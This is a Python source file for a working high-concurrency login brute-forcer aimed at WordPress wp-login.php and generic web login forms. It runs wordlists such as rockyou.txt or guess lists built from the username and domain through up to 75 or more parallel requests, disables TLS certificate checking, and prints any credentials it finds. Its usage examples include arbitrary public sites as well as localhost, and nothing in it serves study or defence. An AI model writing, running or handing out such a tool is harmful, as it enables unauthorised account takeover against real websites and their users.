import asyncio
import aiohttp
import time
import sys
import ssl
import platform
import subprocess

# Windows-specific imports
if platform.system() == "Windows":
    # Set event loop policy for better Windows performance
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

try:
    import aiodns  # pip install aiodns - faster DNS resolution
    HAS_AIODNS = True
except ImportError:
    HAS_AIODNS = False

class UltraFastLoginTester:
    def __init__(self, target_url, username, max_workers=100, attack_type="wordpress", login_endpoint=None):
        self.target_url = target_url.rstrip('/')
        self.username = username
        self.max_workers = max_workers
        self.attack_type = attack_type.lower()
        self.login_endpoint = login_endpoint  # Custom login endpoint
        self.found_password = None
        self.total_attempts = 0
        self.successful_attempts = 0
        self.failed_attempts = 0
        self.error_attempts = 0
        self.start_time = None
        self.last_stats_time = None
        self.last_attempts = 0
        
    async def test_login_universal(self, session, password):
        """Universal login test that works for WordPress and other sites"""
        if self.found_password:
            return None
            
        # Determine login URL and data based on attack type
        if self.attack_type == "wordpress":
            login_url = f"{self.target_url}/wp-login.php"
            data = {
                'log': self.username,
                'pwd': password,
                'wp-submit': 'Log In',
                'testcookie': '1'
            }
            success_indicators = ['wp-admin', 'dashboard']
            redirect_success_paths = ['wp-admin', 'dashboard']
            failure_indicators = ['incorrect', 'invalid', 'error', 'failed']
            
        else:  # Generic form login
            # Use custom login endpoint if provided, otherwise try common paths
            if self.login_endpoint:
                login_url = self.login_endpoint
            else:
                possible_paths = ['/login', '/admin/login', '/user/login', '/account/login', '/signin']
                login_url = f"{self.target_url}/login"  # Default, can be customized
            
            data = {
                'username': self.username,
                'password': password,
                'login': 'Login'
            }
            success_indicators = ['dashboard', 'welcome', 'profile', 'home', 'admin', 'panel', 'success']
            redirect_success_paths = ['dashboard', 'admin', 'home', 'user', 'profile', '3000']  # Added 3000 for localhost redirect
            failure_indicators = ['invalid', 'incorrect', 'error', 'failed', 'wrong', 'unauthorized']
        
        try:
            # Use POST with minimal redirects checking
            async with session.post(login_url, data=data, allow_redirects=False, timeout=5) as response:
                self.total_attempts += 1
                
                # Fast success detection for redirects
                if response.status in [302, 301, 303]:
                    location = response.headers.get('Location', '').lower()
                    
                    # Check if redirect indicates success
                    if any(indicator in location for indicator in redirect_success_paths):
                        self.found_password = password
                        print(f"\n🎉 SUCCESS! Found credentials: {self.username}:{password}")
                        print(f"📍 Redirect to: {response.headers.get('Location', 'N/A')}")
                        return password
                    else:
                        self.failed_attempts += 1
                        
                elif response.status == 200:
                    try:
                        # Only read first 2KB to check for success indicators
                        content = await response.content.read(2048)
                        text = content.decode('utf-8', errors='ignore').lower()
                        
                        # Check for failure indicators first (faster)
                        has_failure = any(indicator in text for indicator in failure_indicators)
                        
                        if not has_failure:
                            # Check for success indicators
                            has_success = any(indicator in text for indicator in success_indicators)
                            
                            # Additional checks for successful login
                            logout_present = 'logout' in text
                            login_form_absent = 'type="password"' not in text or 'login' not in text
                            
                            if has_success or (logout_present and login_form_absent):
                                self.found_password = password
                                print(f"\n🎉 SUCCESS! Found credentials: {self.username}:{password}")
                                return password
                        
                        self.failed_attempts += 1
                        
                    except Exception:
                        self.failed_attempts += 1
                else:
                    self.failed_attempts += 1
                    
        except asyncio.TimeoutError:
            self.error_attempts += 1
        except Exception as e:
            self.error_attempts += 1
            
        return None
    
    async def print_stats(self):
        """Print live statistics"""
        while not self.found_password:
            await asyncio.sleep(2)  # Update every 2 seconds
            
            current_time = time.time()
            if self.last_stats_time:
                elapsed = current_time - self.start_time
                recent_elapsed = current_time - self.last_stats_time
                recent_attempts = self.total_attempts - self.last_attempts
                
                overall_rate = self.total_attempts / elapsed if elapsed > 0 else 0
                recent_rate = recent_attempts / recent_elapsed if recent_elapsed > 0 else 0
                
                print(f"\r📊 Total: {self.total_attempts:,} | "
                      f"Rate: {overall_rate:.1f}/s | "
                      f"Recent: {recent_rate:.1f}/s | "
                      f"Failed: {self.failed_attempts:,} | "
                      f"Errors: {self.error_attempts:,} | "
                      f"Time: {elapsed:.0f}s", end='', flush=True)
            
            self.last_stats_time = current_time
            self.last_attempts = self.total_attempts
    
    async def run_ultra_fast_attack(self, passwords):
        """Ultra-fast async attack with maximum optimization"""
        self.start_time = time.time()
        self.last_stats_time = time.time()
        self.total_attempts = 0
        
        print(f"🚀 Starting ultra-fast attack on {self.target_url}")
        print(f"👤 Username: {self.username}")
        print(f"🎯 Attack type: {self.attack_type.upper()}")
        print(f"🔢 Passwords to test: {len(passwords):,}")
        print(f"🧵 Max concurrent connections: {self.max_workers}")
        print("=" * 60)
        
        # Create optimized SSL context
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE  # Faster but less secure
        
        # Create high-performance connector (Windows optimized)
        connector = aiohttp.TCPConnector(
            limit=min(self.max_workers * 2, 300),  # Windows has connection limits
            limit_per_host=min(self.max_workers, 150),
            keepalive_timeout=30,  # Shorter for Windows
            enable_cleanup_closed=True,
            ssl=ssl_context,
            use_dns_cache=True,
            force_close=False
        )
        
        # Ultra-short timeout for maximum speed
        timeout = aiohttp.ClientTimeout(
            total=8,
            connect=3,
            sock_read=3
        )
        
        # Optimized headers
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=headers,
            cookie_jar=aiohttp.CookieJar()
        ) as session:
            
            # Start statistics printer
            stats_task = asyncio.create_task(self.print_stats())
            
            # Create semaphore to limit concurrent requests
            semaphore = asyncio.Semaphore(self.max_workers)
            
            async def limited_test(password):
                async with semaphore:
                    return await self.test_login_universal(session, password)
            
            # Process passwords in batches for memory efficiency
            batch_size = min(self.max_workers * 10, 1000)
            
            for i in range(0, len(passwords), batch_size):
                if self.found_password:
                    break
                    
                batch = passwords[i:i + batch_size]
                tasks = [limited_test(pwd) for pwd in batch]
                
                # Process batch
                try:
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    # Check results
                    for result in results:
                        if result and not isinstance(result, Exception):
                            stats_task.cancel()
                            elapsed = time.time() - self.start_time
                            
                            print(f"\n\n🎯 ATTACK COMPLETED SUCCESSFULLY!")
                            print(f"✅ Found password: {result}")
                            print(f"⏱️  Time taken: {elapsed:.2f} seconds")
                            print(f"🔢 Total attempts: {self.total_attempts:,}")
                            print(f"⚡ Average rate: {self.total_attempts/elapsed:.1f} attempts/second")
                            print(f"📈 Success rate: {(1/self.total_attempts)*100:.4f}%")
                            
                            return result
                            
                except Exception as e:
                    print(f"Batch error: {e}")
                    continue
                
                # Very small delay to prevent overwhelming
                await asyncio.sleep(0.01)
        
        # Attack completed without success
        stats_task.cancel()
        elapsed = time.time() - self.start_time
        
        print(f"\n\n❌ ATTACK COMPLETED - NO PASSWORD FOUND")
        print(f"⏱️  Time taken: {elapsed:.2f} seconds")
        print(f"🔢 Total attempts: {self.total_attempts:,}")
        print(f"⚡ Average rate: {self.total_attempts/elapsed:.1f} attempts/second")
        print(f"📊 Failed: {self.failed_attempts:,} | Errors: {self.error_attempts:,}")
        
        return None

def load_wordlist_optimized(filename, max_passwords=None, start_from=0):
    """Load wordlist with optimizations"""
    passwords = []
    
    try:
        print(f"📖 Loading wordlist: {filename}")
        
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            # Skip to start position if needed
            if start_from > 0:
                for _ in range(start_from):
                    f.readline()
            
            for i, line in enumerate(f):
                if max_passwords and len(passwords) >= max_passwords:
                    break
                    
                password = line.strip()
                if password and len(password) > 0:
                    passwords.append(password)
                
                # Progress indicator for large files
                if (len(passwords) + 1) % 100000 == 0:
                    print(f"📚 Loaded {len(passwords):,} passwords...")
        
        print(f"✅ Loaded {len(passwords):,} passwords from wordlist")
        return passwords
        
    except FileNotFoundError:
        print(f"❌ Wordlist file not found: {filename}")
        return []
    except Exception as e:
        print(f"❌ Error loading wordlist: {e}")
        return []

def generate_smart_passwords(username, target_domain="", max_count=10000):
    """Generate smart password list based on target"""
    passwords = set()
    
    # Extract domain name
    domain_name = target_domain.replace('https://', '').replace('http://', '').split('.')[0]
    
    # Common base words
    base_words = [
        'admin', 'password', 'pass', 'root', 'user', 'login',
        username, domain_name, 'welcome', 'secret', 'private',
        '123456', 'password123', 'admin123', 'letmein', 'qwerty'
    ]
    
    # Common years and numbers
    years = ['2020', '2021', '2022', '2023', '2024', '2025']
    numbers = ['1', '12', '123', '1234', '12345', '123456', '321', '!', '@', '#', '$']
    
    # Generate combinations
    for word in base_words:
        if not word:
            continue
            
        passwords.add(word)
        passwords.add(word.capitalize())
        passwords.add(word.upper())
        passwords.add(word.lower())
        
        # Add with numbers/symbols
        for suffix in numbers + years:
            passwords.add(word + suffix)
            passwords.add(word.capitalize() + suffix)
            passwords.add(suffix + word)
        
        # Common substitutions
        substitutions = {'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 'A': '@'}
        modified = word
        for old, new in substitutions.items():
            modified = modified.replace(old, new)
        
        passwords.add(modified)
        passwords.add(modified + '123')
    
    password_list = list(passwords)[:max_count]
    print(f"🧠 Generated {len(password_list)} smart passwords")
    return password_list

async def ultra_fast_login_attack(url, username, password_file=None, max_workers=75, max_passwords=None, attack_type="wordpress", login_endpoint=None):
    """Main ultra-fast login attack function (works for WordPress and other sites)"""
    
    print("🏠 Running on Windows - using optimized settings")
    
    # Windows-specific optimizations
    if platform.system() == "Windows":
        # Adjust max_workers for Windows limitations
        max_workers = min(max_workers, 75)  # Windows handles fewer concurrent connections better
        print(f"⚙️  Adjusted max workers to {max_workers} for Windows")
    
    # Load passwords
    if password_file:
        passwords = load_wordlist_optimized(password_file, max_passwords)
        if not passwords:
            print("🧠 Falling back to generated passwords")
            passwords = generate_smart_passwords(username, url)
    else:
        passwords = generate_smart_passwords(username, url)
    
    if not passwords:
        print("❌ No passwords to test!")
        return None
    
    # Create and run tester
    tester = UltraFastLoginTester(url, username, max_workers, attack_type, login_endpoint)
    result = await tester.run_ultra_fast_attack(passwords)
    
    return result

# Command line interface
if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("🚀 Ultra-Fast Login Brute Forcer (WordPress & Generic Sites)")
        print("\nUsage:")
        print("python ultra_fast.py <url> <username> [password_file] [max_workers] [max_passwords] [attack_type] [login_endpoint]")
        print("\nExamples:")
        print("python ultra_fast.py https://site.com admin")
        print("python ultra_fast.py http://localhost:3000 admin rockyou.txt 50 10000 generic http://localhost:8000/login")
        print("python ultra_fast.py https://site.com admin rockyou.txt 75 1000000 generic")
        print("\nFor your localhost setup:")
        print("python ultra_fast.py http://localhost:3000 admin passwords.txt 30 50000 generic http://localhost:8000/login")
        print("\nAttack Types:")
        print("- wordpress: For WordPress sites (default)")
        print("- generic: For other login forms")
        print("\nWindows Notes:")
        print("- For localhost: Use lower max_workers (20-50)")
        print("- Install: pip install aiohttp")
        sys.exit(1)
    
    url = sys.argv[1]
    username = sys.argv[2]
    password_file = sys.argv[3] if len(sys.argv) > 3 else None
    max_workers = int(sys.argv[4]) if len(sys.argv) > 4 else 75
    max_passwords = int(sys.argv[5]) if len(sys.argv) > 5 else None
    attack_type = sys.argv[6] if len(sys.argv) > 6 else "wordpress"
    login_endpoint = sys.argv[7] if len(sys.argv) > 7 else None
    
    try:
        result = asyncio.run(ultra_fast_login_attack(url, username, password_file, max_workers, max_passwords, attack_type, login_endpoint))
        
        if result:
            print(f"\n🎉 FINAL RESULT: {username}:{result}")
        else:
            print(f"\n❌ No valid password found for {username}")
            
    except KeyboardInterrupt:
        print(f"\n⚠️  Attack interrupted by user")
    except Exception as e:
        print(f"\n💥 Error: {e}")